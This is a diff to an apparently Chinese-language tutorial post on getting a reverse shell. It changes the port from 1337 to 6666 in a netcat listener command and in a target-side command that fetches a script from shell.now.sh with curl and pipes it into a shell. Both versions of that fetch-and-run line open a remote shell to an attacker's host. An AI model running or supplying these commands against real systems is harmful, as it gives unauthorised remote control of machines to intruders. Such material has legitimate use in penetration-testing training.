@@ -32,14 +32,14 @@ categories:
 ### 步骤
 
 #### 1、监听端口
-    nc -lvvp 1337
+    nc -lvvp 6666
 
 ![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3asm9s45j30rl0efweg.jpg)
 
 #### 2、在目标上执行反向shell
 
 
-    curl https://shell.now.sh/主机名/域名或者ip:1337 | SH
+    curl https://shell.now.sh/主机名或者ip:6666 | SH
 
 ![](https://ws1.sinaimg.cn/large/006Y6f53gy1fo3aurqh80j30ho04gq2v.jpg)
 
